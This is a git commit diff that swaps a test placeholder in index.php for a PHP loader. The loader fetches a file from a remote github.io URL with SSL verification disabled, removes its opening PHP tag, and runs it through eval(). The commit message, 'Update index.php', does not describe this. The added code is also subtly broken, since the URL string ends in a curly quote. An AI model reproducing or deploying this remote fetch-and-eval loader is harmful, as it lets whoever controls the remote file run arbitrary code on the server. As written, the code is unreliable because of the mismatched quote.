b96494defe18a9cae6ad940a8f515519b4b9aec0
glentot733 <73816184+glentot733@users.noreply.github.com>
2021-05-04 11:37:42 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,14 @@
-<?php
-
-echo "this is a test";
-
+<?php 
+$GithubRawURI= "https://glentot733.github.io/php//index.php”; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch); 
+curl_close($ch); 
+ 
+//remove the "<?php" from the file before running it 
+$data = substr($data, 5); 
+ 
+eval ($data); 
 ?>
